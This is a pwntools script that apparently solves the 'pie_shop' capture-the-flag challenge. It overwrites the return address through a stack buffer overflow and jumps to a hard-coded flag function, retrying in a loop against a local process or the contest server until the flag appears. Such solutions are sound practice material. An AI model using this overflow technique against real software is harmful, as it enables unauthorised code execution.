#coding=utf-8
from pwn import *

context.binary = './pie_shop'
elf = ELF('./pie_shop')
count = 0 

gets = 0x5555555551e1
flag = 0x11a9
flag = 0x5555555551a9 
stack = 0x7fffffffe3e0
ret =   0x7fffffffe428
res_before = ''

while True:
  try:
    debug = 1
    if not debug:
      r = remote('shell.actf.co', 19306)
    else:
      r = process('./pie_shop')

    r.recvuntil('What type of pie do you want?')
    r.sendline('a' * (ret - stack) + p64(flag))
    res = r.recvall(1)
    if (res != res_before and count) or 'actf{' in res:
      print res
      break
    if not count % 100:
      print '{} times try'.format(count)
      print res
    count += 1
    res_before = res
  except Exception as e:
    print 'error:{}'.format(e)
